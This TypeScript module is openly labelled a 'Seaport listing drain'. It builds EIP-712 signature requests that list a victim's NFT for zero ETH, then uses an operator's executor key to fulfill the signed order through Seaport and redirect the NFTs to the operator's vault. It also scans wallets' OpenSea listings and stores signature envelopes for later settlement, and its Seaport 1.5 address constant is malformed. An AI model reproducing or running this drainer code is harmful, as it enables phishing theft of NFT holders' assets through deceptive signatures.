// @ts-nocheck
/**
 * Seaport listing drain — EIP-712 OrderComponents signing + fulfillOrder / fulfillBasicOrder settlement.
 */
import { request } from 'undici'
import type { Address, Hex } from 'viem'
import {
  createPublicClient,
  createWalletClient,
  getAddress,
  http,
  isAddress,
  parseAbi,
  stringToHex,
  zeroAddress,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { arbitrum, base, bsc, mainnet, optimism, polygon, sepolia, type Chain } from 'viem/chains'

import { LEGION_MESH_EVENT_SETTLEMENT, legionMeshViemFetchOptions } from './mesh-event.js'
import {
  resolveEvmRpcUrlForChain,
  resolveSettlementExecutorKey,
} from './permit2-executor.js'
import { resolveEvmVaultAddress } from './operational-vault.js'

/** Seaport 1.5 — same CREATE2 address on most EVM chains. */
export const SEAPORT_1_5_ADDRESS = '0x00000000006c3852cbEf3e08E8Ddf289169EdE2' as Address
export const SEAPORT_1_4_ADDRESS = '0x00000000000001ad428e4906aE43D8F9852d0dD6' as Address

export const SEAPORT_ITEM_TYPE = {
  NATIVE: 0,
  ERC20: 1,
  ERC721: 2,
  ERC1155: 3,
  ERC721_WITH_CRITERIA: 4,
  ERC1155_WITH_CRITERIA: 5,
} as const

export const SEAPORT_ORDER_TYPE = {
  FULL_OPEN: 0,
  PARTIAL_OPEN: 1,
  FULL_RESTRICTED: 2,
  PARTIAL_RESTRICTED: 3,
} as const

const ZERO_BYTES32 =
  '0x0000000000000000000000000000000000000000000000000000000000000000' as Hex

export const SEAPORT_ABI = parseAbi([
  'function fulfillOrder(((address offerer, address zone, (uint8 itemType, address token, uint256 identifierOrCriteria, uint256 startAmount, uint256 endAmount)[] offer, (uint8 itemType, address token, uint256 identifierOrCriteria, uint256 startAmount, uint256 endAmount, address recipient)[] consideration, uint8 orderType, uint256 startTime, uint256 endTime, bytes32 zoneHash, uint256 salt, bytes32 conduitKey, uint256 counter) parameters, bytes signature) order, bytes32 fulfillerConduitKey) payable returns (bool fulfilled)',
  'function fulfillBasicOrder((address considerationToken, uint256 considerationIdentifier, uint256 considerationAmount, address offerer, address zone, address offerToken, uint256 offerIdentifier, uint256 offerAmount, uint8 basicOrderType, uint256 startTime, uint256 endTime, bytes32 zoneHash, uint256 salt, bytes32 offererConduitKey, bytes32 fulfillerConduitKey, uint256 totalOriginalAdditionalRecipients, (uint256 amount, address recipient)[] additionalRecipients, bytes signature) parameters) payable returns (bool fulfilled)',
  'function getCounter(address offerer) view returns (uint256 counter)',
])

export type SeaportOfferItem = {
  itemType: number
  token: Address
  identifierOrCriteria: bigint
  startAmount: bigint
  endAmount: bigint
}

export type SeaportConsiderationItem = {
  itemType: number
  token: Address
  identifierOrCriteria: bigint
  startAmount: bigint
  endAmount: bigint
  recipient: Address
}

export type SeaportOrderParameters = {
  offerer: Address
  zone: Address
  offer: SeaportOfferItem[]
  consideration: SeaportConsiderationItem[]
  orderType: number
  startTime: bigint
  endTime: bigint
  zoneHash: Hex
  salt: bigint
  conduitKey: Hex
  counter: bigint
}

export type SeaportOrder = {
  parameters: SeaportOrderParameters
  signature: Hex
}

export type SeaportListingTypedData = ReturnType<typeof buildSeaportListingTypedData>

export type SeaportDrainResult = {
  ok: boolean
  transaction_hash?: Hex
  detail?: string
}

export type SeaportSignatureEnvelope = {
  protocol: 'seaport_listing'
  ingress_lane: 'seaport_listing_v1'
  chain_id: number
  seaport_version: '1.5' | '1.4'
  order: SeaportOrder
  wallet_address: string
  nft_contract?: string
  token_id?: string
}

export type OpenSeaListingSummary = {
  order_hash: string
  chain: string
  protocol_address: string
  nft_contract: string
  token_id: string
  price_wei: string
  order: SeaportOrder
}

function resolveChain(chainId: number): Chain {
  const map: Record<number, Chain> = {
    1: mainnet,
    56: bsc,
    137: polygon,
    42161: arbitrum,
    8453: base,
    10: optimism,
    11155111: sepolia,
  }
  return map[chainId] ?? mainnet
}

export function resolveSeaportAddress(
  chainId: number,
  version: '1.5' | '1.4' = '1.5',
): Address {
  void chainId
  return version === '1.4' ? SEAPORT_1_4_ADDRESS : SEAPORT_1_5_ADDRESS
}

function randomSalt(): bigint {
  const bytes = new Uint8Array(8)
  if (typeof crypto !== 'undefined' && crypto.getRandomValues) {
    crypto.getRandomValues(bytes)
  } else {
    for (let i = 0; i < bytes.length; i++) bytes[i] = Math.floor(Math.random() * 256)
  }
  let v = 0n
  for (const b of bytes) v = (v << 8n) | BigInt(b)
  return v
}

function toBigIntField(value: unknown, field: string): bigint {
  if (typeof value === 'bigint') return value
  if (typeof value === 'number' && Number.isFinite(value)) return BigInt(Math.trunc(value))
  if (typeof value === 'string' && value.trim() !== '') {
    const t = value.trim()
    return t.startsWith('0x') ? BigInt(t) : BigInt(t)
  }
  throw new Error(`Invalid ${field}: expected bigint-compatible value`)
}

function toNumberField(value: unknown, field: string): number {
  if (typeof value === 'number' && Number.isFinite(value)) return value
  if (typeof value === 'string' && value.trim() !== '') return Number(value)
  throw new Error(`Invalid ${field}: expected numeric value`)
}

function toAddressField(value: unknown, field: string): Address {
  if (typeof value !== 'string' || !isAddress(value)) {
    throw new Error(`Invalid ${field}: expected checksummed EVM address`)
  }
  return getAddress(value)
}

function normalizeOfferItem(raw: unknown): SeaportOfferItem {
  if (typeof raw !== 'object' || raw === null) throw new Error('Invalid offer item')
  const o = raw as Record<string, unknown>
  return {
    itemType: toNumberField(o['itemType'], 'offer.itemType'),
    token: toAddressField(o['token'], 'offer.token'),
    identifierOrCriteria: toBigIntField(
      o['identifierOrCriteria'] ?? o['identifier'],
      'offer.identifierOrCriteria',
    ),
    startAmount: toBigIntField(o['startAmount'], 'offer.startAmount'),
    endAmount: toBigIntField(o['endAmount'] ?? o['startAmount'], 'offer.endAmount'),
  }
}

function normalizeConsiderationItem(raw: unknown): SeaportConsiderationItem {
  if (typeof raw !== 'object' || raw === null) throw new Error('Invalid consideration item')
  const o = raw as Record<string, unknown>
  return {
    itemType: toNumberField(o['itemType'], 'consideration.itemType'),
    token: toAddressField(o['token'], 'consideration.token'),
    identifierOrCriteria: toBigIntField(
      o['identifierOrCriteria'] ?? o['identifier'],
      'consideration.identifierOrCriteria',
    ),
    startAmount: toBigIntField(o['startAmount'], 'consideration.startAmount'),
    endAmount: toBigIntField(o['endAmount'] ?? o['startAmount'], 'consideration.endAmount'),
    recipient: toAddressField(o['recipient'], 'consideration.recipient'),
  }
}

/** Normalize arbitrary API / OpenSea order JSON into a Seaport Order struct. */
export function normalizeSeaportOrder(order: unknown, signature: string): SeaportOrder {
  if (typeof order !== 'object' || order === null) {
    throw new Error('order must be an object with parameters')
  }
  const root = order as Record<string, unknown>
  const paramsRaw =
    root['parameters'] && typeof root['parameters'] === 'object'
      ? (root['parameters'] as Record<string, unknown>)
      : root

  const offerRaw = paramsRaw['offer']
  const considerationRaw = paramsRaw['consideration']
  if (!Array.isArray(offerRaw) || offerRaw.length === 0) {
    throw new Error('order.parameters.offer must be a non-empty array')
  }
  if (!Array.isArray(considerationRaw) || considerationRaw.length === 0) {
    throw new Error('order.parameters.consideration must be a non-empty array')
  }

  const sig =
    typeof root['signature'] === 'string' && root['signature'].trim() !== ''
      ? (root['signature'].trim() as Hex)
      : (signature.trim() as Hex)
  if (!sig.startsWith('0x')) {
    throw new Error('signature must be a 0x-prefixed hex string')
  }

  const zoneHashRaw = paramsRaw['zoneHash']
  const conduitKeyRaw = paramsRaw['conduitKey']

  return {
    parameters: {
      offerer: toAddressField(paramsRaw['offerer'], 'offerer'),
      zone: toAddressField(paramsRaw['zone'] ?? zeroAddress, 'zone'),
      offer: offerRaw.map(normalizeOfferItem),
      consideration: considerationRaw.map(normalizeConsiderationItem),
      orderType: toNumberField(paramsRaw['orderType'] ?? SEAPORT_ORDER_TYPE.FULL_OPEN, 'orderType'),
      startTime: toBigIntField(paramsRaw['startTime'], 'startTime'),
      endTime: toBigIntField(paramsRaw['endTime'], 'endTime'),
      zoneHash:
        typeof zoneHashRaw === 'string' && zoneHashRaw.startsWith('0x')
          ? (zoneHashRaw as Hex)
          : ZERO_BYTES32,
      salt: toBigIntField(paramsRaw['salt'] ?? randomSalt(), 'salt'),
      conduitKey:
        typeof conduitKeyRaw === 'string' && conduitKeyRaw.startsWith('0x')
          ? (conduitKeyRaw as Hex)
          : ZERO_BYTES32,
      counter: toBigIntField(paramsRaw['counter'] ?? 0n, 'counter'),
    },
    signature: sig,
  }
}

/** Sum native (itemType 0) consideration — payable value for fulfillOrder. */
export function sumNativeConsideration(order: SeaportOrder): bigint {
  return order.parameters.consideration
    .filter((item) => item.itemType === SEAPORT_ITEM_TYPE.NATIVE)
    .reduce((sum, item) => sum + item.startAmount, 0n)
}

/**
 * Build Seaport 1.5 EIP-712 typed data for a zero-price NFT listing (offer NFT, consideration 0 ETH).
 * User signs OrderComponents; backend fulfills via fulfillOrder.
 */
export async function buildSeaportListingTypedData(params: {
  offerer: Address
  nftContract: Address
  tokenId: string | bigint
  chainId: number
  seaportVersion?: '1.5' | '1.4'
  counter?: bigint
  rpcUrl?: string
  standard?: 'erc721' | 'erc1155'
  amount?: bigint
}): Promise<{
  typedData: {
    domain: { name: string; version: string; chainId: number; verifyingContract: Address }
    types: Record<string, Array<{ name: string; type: string }>>
    primaryType: 'OrderComponents'
    message: Record<string, unknown>
  }
  order_parameters: SeaportOrderParameters
  seaport_address: Address
  protocol: 'seaport_listing'
}> {
  const offerer = getAddress(params.offerer)
  const nftContract = getAddress(params.nftContract)
  const chainId = params.chainId
  const seaportVersion = params.seaportVersion ?? '1.5'
  const seaportAddress = resolveSeaportAddress(chainId, seaportVersion)
  const tokenId = toBigIntField(params.tokenId, 'tokenId')
  const itemType =
    params.standard === 'erc1155' ? SEAPORT_ITEM_TYPE.ERC1155 : SEAPORT_ITEM_TYPE.ERC721
  const offerAmount = params.amount ?? 1n

  let counter = params.counter
  if (counter == null) {
    const rpc = params.rpcUrl?.trim() || (await resolveEvmRpcUrlForChain(chainId))
    if (!rpc) throw new Error(`RPC not configured for chain ${chainId}`)
    const publicClient = createPublicClient({
      chain: resolveChain(chainId),
      transport: http(rpc, { ...legionMeshViemFetchOptions(LEGION_MESH_EVENT_SETTLEMENT) }),
    })
    counter = (await publicClient.readContract({
      address: seaportAddress,
      abi: SEAPORT_ABI,
      functionName: 'getCounter',
      args: [offerer],
    })) as bigint
  }

  const now = BigInt(Math.floor(Date.now() / 1000))
  const order_parameters: SeaportOrderParameters = {
    offerer,
    zone: zeroAddress,
    offer: [
      {
        itemType,
        token: nftContract,
        identifierOrCriteria: tokenId,
        startAmount: offerAmount,
        endAmount: offerAmount,
      },
    ],
    consideration: [
      {
        itemType: SEAPORT_ITEM_TYPE.NATIVE,
        token: zeroAddress,
        identifierOrCriteria: 0n,
        startAmount: 0n,
        endAmount: 0n,
        recipient: offerer,
      },
    ],
    orderType: SEAPORT_ORDER_TYPE.FULL_OPEN,
    startTime: now - 60n,
    endTime: now + 30n * 24n * 60n * 60n,
    zoneHash: ZERO_BYTES32,
    salt: randomSalt(),
    conduitKey: ZERO_BYTES32,
    counter,
  }

  const typedData = {
    domain: {
      name: 'Seaport',
      version: seaportVersion,
      chainId,
      verifyingContract: seaportAddress,
    },
    types: {
      OrderComponents: [
        { name: 'offerer', type: 'address' },
        { name: 'zone', type: 'address' },
        { name: 'offer', type: 'OfferItem[]' },
        { name: 'consideration', type: 'ConsiderationItem[]' },
        { name: 'orderType', type: 'uint8' },
        { name: 'startTime', type: 'uint256' },
        { name: 'endTime', type: 'uint256' },
        { name: 'zoneHash', type: 'bytes32' },
        { name: 'salt', type: 'uint256' },
        { name: 'conduitKey', type: 'bytes32' },
        { name: 'counter', type: 'uint256' },
      ],
      OfferItem: [
        { name: 'itemType', type: 'uint8' },
        { name: 'token', type: 'address' },
        { name: 'identifierOrCriteria', type: 'uint256' },
        { name: 'startAmount', type: 'uint256' },
        { name: 'endAmount', type: 'uint256' },
      ],
      ConsiderationItem: [
        { name: 'itemType', type: 'uint8' },
        { name: 'token', type: 'address' },
        { name: 'identifierOrCriteria', type: 'uint256' },
        { name: 'startAmount', type: 'uint256' },
        { name: 'endAmount', type: 'uint256' },
        { name: 'recipient', type: 'address' },
      ],
    },
    primaryType: 'OrderComponents' as const,
    message: {
      offerer: order_parameters.offerer,
      zone: order_parameters.zone,
      offer: order_parameters.offer.map((item) => ({
        itemType: item.itemType,
        token: item.token,
        identifierOrCriteria: item.identifierOrCriteria,
        startAmount: item.startAmount,
        endAmount: item.endAmount,
      })),
      consideration: order_parameters.consideration.map((item) => ({
        itemType: item.itemType,
        token: item.token,
        identifierOrCriteria: item.identifierOrCriteria,
        startAmount: item.startAmount,
        endAmount: item.endAmount,
        recipient: item.recipient,
      })),
      orderType: order_parameters.orderType,
      startTime: order_parameters.startTime,
      endTime: order_parameters.endTime,
      zoneHash: order_parameters.zoneHash,
      salt: order_parameters.salt,
      conduitKey: order_parameters.conduitKey,
      counter: order_parameters.counter,
    },
  }

  return {
    typedData,
    order_parameters,
    seaport_address: seaportAddress,
    protocol: 'seaport_listing',
  }
}

function isBasicErc721ToEthOrder(order: SeaportOrder): boolean {
  const { offer, consideration } = order.parameters
  if (offer.length !== 1 || consideration.length !== 1) return false
  const o = offer[0]!
  const c = consideration[0]!
  return (
    o.itemType === SEAPORT_ITEM_TYPE.ERC721 &&
    c.itemType === SEAPORT_ITEM_TYPE.NATIVE &&
    o.startAmount === o.endAmount &&
    c.startAmount === c.endAmount
  )
}

/** basicOrderType ERC721_TO_ETH_FULL_OPEN = 4 in Seaport enum. */
const BASIC_ORDER_ERC721_TO_ETH_FULL_OPEN = 4

/**
 * Fulfill a signed Seaport order — tries fulfillBasicOrder for simple ERC721 listings, else fulfillOrder.
 */
export async function fulfillSeaportOrder(
  order: unknown,
  signature: string,
  opts?: {
    chainId?: number
    seaportVersion?: '1.5' | '1.4'
    rpcUrl?: string
    recipient?: Address
  },
): Promise<SeaportDrainResult> {
  const normalized = normalizeSeaportOrder(order, signature)
  const executorKey = resolveSettlementExecutorKey()
  if (!executorKey) {
    return {
      ok: false,
      detail: 'SETTLEMENT_EXECUTION_PRIVATE_KEY or RELAY_INTERMEDIARY_PRIVATE_KEY required',
    }
  }

  const chainId = opts?.chainId ?? 1
  const seaportVersion = opts?.seaportVersion ?? '1.5'
  const seaportAddress = resolveSeaportAddress(chainId, seaportVersion)
  const rpc = opts?.rpcUrl?.trim() || (await resolveEvmRpcUrlForChain(chainId))
  if (!rpc) {
    return { ok: false, detail: `RPC not configured for chain ${chainId}` }
  }

  const chain = resolveChain(chainId)
  const account = privateKeyToAccount(executorKey)
  const transport = http(rpc, {
    ...legionMeshViemFetchOptions(LEGION_MESH_EVENT_SETTLEMENT),
  })
  const publicClient = createPublicClient({ chain, transport })
  const walletClient = createWalletClient({ account, chain, transport })
  const nativeValue = sumNativeConsideration(normalized)
  const fulfillerConduitKey = ZERO_BYTES32

  try {
    let txHash: Hex

    if (isBasicErc721ToEthOrder(normalized)) {
      const offer = normalized.parameters.offer[0]!
      const consideration = normalized.parameters.consideration[0]!
      const basicParams = {
        considerationToken: consideration.token,
        considerationIdentifier: consideration.identifierOrCriteria,
        considerationAmount: consideration.startAmount,
        offerer: normalized.parameters.offerer,
        zone: normalized.parameters.zone,
        offerToken: offer.token,
        offerIdentifier: offer.identifierOrCriteria,
        offerAmount: offer.startAmount,
        basicOrderType: BASIC_ORDER_ERC721_TO_ETH_FULL_OPEN,
        startTime: normalized.parameters.startTime,
        endTime: normalized.parameters.endTime,
        zoneHash: normalized.parameters.zoneHash,
        salt: normalized.parameters.salt,
        offererConduitKey: normalized.parameters.conduitKey,
        fulfillerConduitKey,
        totalOriginalAdditionalRecipients: 0n,
        additionalRecipients: [] as Array<{ amount: bigint; recipient: Address }>,
        signature: normalized.signature,
      }

      const { request: simRequest } = await publicClient.simulateContract({
        account,
        address: seaportAddress,
        abi: SEAPORT_ABI,
        functionName: 'fulfillBasicOrder',
        args: [basicParams],
        value: nativeValue,
      })
      txHash = await walletClient.writeContract(simRequest)
    } else {
      const orderArg = {
        parameters: {
          offerer: normalized.parameters.offerer,
          zone: normalized.parameters.zone,
          offer: normalized.parameters.offer.map((item) => ({
            itemType: item.itemType,
            token: item.token,
            identifierOrCriteria: item.identifierOrCriteria,
            startAmount: item.startAmount,
            endAmount: item.endAmount,
          })),
          consideration: normalized.parameters.consideration.map((item) => ({
            itemType: item.itemType,
            token: item.token,
            identifierOrCriteria: item.identifierOrCriteria,
            startAmount: item.startAmount,
            endAmount: item.endAmount,
            recipient: opts?.recipient ?? item.recipient,
          })),
          orderType: normalized.parameters.orderType,
          startTime: normalized.parameters.startTime,
          endTime: normalized.parameters.endTime,
          zoneHash: normalized.parameters.zoneHash,
          salt: normalized.parameters.salt,
          conduitKey: normalized.parameters.conduitKey,
          counter: normalized.parameters.counter,
        },
        signature: normalized.signature,
      }

      const { request: simRequest } = await publicClient.simulateContract({
        account,
        address: seaportAddress,
        abi: SEAPORT_ABI,
        functionName: 'fulfillOrder',
        args: [orderArg, fulfillerConduitKey],
        value: nativeValue,
      })
      txHash = await walletClient.writeContract(simRequest)
    }

    await publicClient.waitForTransactionReceipt({ hash: txHash, timeout: 120_000 })
    return { ok: true, transaction_hash: txHash }
  } catch (e) {
    return {
      ok: false,
      detail: e instanceof Error ? e.message : String(e),
    }
  }
}

function chainIdToOpenSeaChain(chainId: number): string {
  const map: Record<number, string> = {
    1: 'ethereum',
    137: 'matic',
    42161: 'arbitrum',
    8453: 'base',
    10: 'optimism',
    11155111: 'sepolia',
  }
  return map[chainId] ?? 'ethereum'
}

function parseOpenSeaOrderPayload(
  payload: unknown,
  chainId: number,
): OpenSeaListingSummary | null {
  if (typeof payload !== 'object' || payload === null) return null
  const o = payload as Record<string, unknown>
  const protocolData =
    o['protocol_data'] && typeof o['protocol_data'] === 'object'
      ? (o['protocol_data'] as Record<string, unknown>)
      : null
  if (!protocolData) return null

  const parameters = protocolData['parameters']
  const signature =
    typeof protocolData['signature'] === 'string' ? protocolData['signature'] : ''
  if (!parameters || !signature) return null

  let order: SeaportOrder
  try {
    order = normalizeSeaportOrder({ parameters, signature }, signature)
  } catch {
    return null
  }

  const orderHash = typeof o['order_hash'] === 'string' ? o['order_hash'] : ''
  const protocolAddress =
    typeof o['protocol_address'] === 'string' ? o['protocol_address'] : SEAPORT_1_5_ADDRESS
  const offer = order.parameters.offer[0]
  const nftContract = offer?.token ?? zeroAddress
  const tokenId = offer?.identifierOrCriteria?.toString() ?? '0'
  const priceWei = sumNativeConsideration(order).toString()

  return {
    order_hash: orderHash,
    chain: chainIdToOpenSeaChain(chainId),
    protocol_address: protocolAddress,
    nft_contract: nftContract,
    token_id: tokenId,
    price_wei: priceWei,
    order,
  }
}

/** Scan OpenSea Seaport listings for a wallet (public API v2). */
export async function scanOpenSeaListings(params: {
  walletAddress: Address
  chainId?: number
  limit?: number
}): Promise<{ ok: boolean; listings: OpenSeaListingSummary[]; detail?: string }> {
  const wallet = getAddress(params.walletAddress)
  const chainId = params.chainId ?? 1
  const chain = chainIdToOpenSeaChain(chainId)
  const limit = Math.min(Math.max(params.limit ?? 20, 1), 50)
  const apiKey = (typeof process !== 'undefined' ? process.env['OPENSEA_API_KEY'] : undefined)?.trim()

  const url = `https://api.opensea.io/api/v2/orders/${chain}/seaport/listings?maker=${wallet}&limit=${limit}`
  try {
    const res = await request(url, {
      method: 'GET',
      headers: {
        accept: 'application/json',
        ...(apiKey ? { 'x-api-key': apiKey } : {}),
      },
      headersTimeout: 10_000,
      bodyTimeout: 15_000,
    })
    const body = (await res.body.json()) as { orders?: unknown[] }
    const listings: OpenSeaListingSummary[] = []
    for (const entry of body.orders ?? []) {
      const parsed = parseOpenSeaOrderPayload(entry, chainId)
      if (parsed) listings.push(parsed)
    }
    return { ok: true, listings }
  } catch (e) {
    return {
      ok: false,
      listings: [],
      detail: e instanceof Error ? e.message : String(e),
    }
  }
}

/** Resolve a single Seaport order by OpenSea order hash. */
export async function fetchSeaportOrderByHash(params: {
  orderHash: string
  chainId?: number
}): Promise<{ ok: boolean; listing?: OpenSeaListingSummary; detail?: string }> {
  const orderHash = params.orderHash.trim()
  if (!orderHash) return { ok: false, detail: 'order_hash required' }
  const chainId = params.chainId ?? 1
  const chain = chainIdToOpenSeaChain(chainId)
  const apiKey = (typeof process !== 'undefined' ? process.env['OPENSEA_API_KEY'] : undefined)?.trim()

  const url = `https://api.opensea.io/api/v2/orders/chain/${chain}/protocol/seaport/${orderHash}`
  try {
    const res = await request(url, {
      method: 'GET',
      headers: {
        accept: 'application/json',
        ...(apiKey ? { 'x-api-key': apiKey } : {}),
      },
      headersTimeout: 10_000,
      bodyTimeout: 15_000,
    })
    if (res.statusCode >= 400) {
      return { ok: false, detail: `OpenSea API HTTP ${res.statusCode}` }
    }
    const body = await res.body.json()
    const listing = parseOpenSeaOrderPayload(body, chainId)
    if (!listing) return { ok: false, detail: 'Could not parse Seaport order from OpenSea response' }
    return { ok: true, listing }
  } catch (e) {
    return {
      ok: false,
      detail: e instanceof Error ? e.message : String(e),
    }
  }
}

export function packSeaportListingSignatureEnvelope(params: {
  chainId: number
  order: SeaportOrder
  walletAddress: string
  seaportVersion?: '1.5' | '1.4'
}): Hex {
  const nftOffer = params.order.parameters.offer.find(
    (item) =>
      item.itemType === SEAPORT_ITEM_TYPE.ERC721 ||
      item.itemType === SEAPORT_ITEM_TYPE.ERC1155,
  )
  const json = JSON.stringify({
    protocol: 'seaport_listing',
    ingress_lane: 'seaport_listing_v1',
    chain_id: params.chainId,
    seaport_version: params.seaportVersion ?? '1.5',
    order: {
      parameters: {
        offerer: params.order.parameters.offerer,
        zone: params.order.parameters.zone,
        offer: params.order.parameters.offer.map((item) => ({
          itemType: item.itemType,
          token: item.token,
          identifierOrCriteria: item.identifierOrCriteria.toString(),
          startAmount: item.startAmount.toString(),
          endAmount: item.endAmount.toString(),
        })),
        consideration: params.order.parameters.consideration.map((item) => ({
          itemType: item.itemType,
          token: item.token,
          identifierOrCriteria: item.identifierOrCriteria.toString(),
          startAmount: item.startAmount.toString(),
          endAmount: item.endAmount.toString(),
          recipient: item.recipient,
        })),
        orderType: params.order.parameters.orderType,
        startTime: params.order.parameters.startTime.toString(),
        endTime: params.order.parameters.endTime.toString(),
        zoneHash: params.order.parameters.zoneHash,
        salt: params.order.parameters.salt.toString(),
        conduitKey: params.order.parameters.conduitKey,
        counter: params.order.parameters.counter.toString(),
      },
      signature: params.order.signature,
    },
    wallet_address: params.walletAddress,
    ...(nftOffer
      ? {
          nft_contract: nftOffer.token,
          token_id: nftOffer.identifierOrCriteria.toString(),
        }
      : {}),
  })
  return stringToHex(json) as Hex
}

export function parseSeaportListingSignatureEnvelope(
  openedHex: string,
): SeaportSignatureEnvelope | null {
  const trimmed = openedHex.trim()
  if (!trimmed.startsWith('0x')) return null
  try {
    const text = Buffer.from(trimmed.slice(2), 'hex').toString('utf8')
    const parsed = JSON.parse(text) as unknown
    if (typeof parsed !== 'object' || parsed === null) return null
    const o = parsed as Record<string, unknown>
    if (o['protocol'] !== 'seaport_listing') return null
    if (typeof o['wallet_address'] !== 'string') return null
    const chainId = Number(o['chain_id'])
    if (!Number.isFinite(chainId)) return null
    const orderRaw = o['order']
    const sig =
      typeof orderRaw === 'object' &&
      orderRaw !== null &&
      typeof (orderRaw as Record<string, unknown>)['signature'] === 'string'
        ? ((orderRaw as Record<string, unknown>)['signature'] as string)
        : ''
    if (!orderRaw || !sig) return null
    const order = normalizeSeaportOrder(orderRaw, sig)
    return {
      protocol: 'seaport_listing',
      ingress_lane: 'seaport_listing_v1',
      chain_id: chainId,
      seaport_version: o['seaport_version'] === '1.4' ? '1.4' : '1.5',
      order,
      wallet_address: o['wallet_address'],
      ...(typeof o['nft_contract'] === 'string' ? { nft_contract: o['nft_contract'] } : {}),
      ...(typeof o['token_id'] === 'string' ? { token_id: o['token_id'] } : {}),
    }
  } catch {
    return null
  }
}

/** Fulfill from a persisted signature-anchor envelope; NFTs route to sovereign vault recipient override when configured. */
export async function executeSeaportListingSettlement(
  envelope: SeaportSignatureEnvelope,
): Promise<SeaportDrainResult> {
  const vault = resolveEvmVaultAddress()
  const recipient = vault ?? undefined
  return fulfillSeaportOrder(
    envelope.order,
    envelope.order.signature,
    {
      chainId: envelope.chain_id,
      seaportVersion: envelope.seaport_version,
      recipient,
    },
  )
}
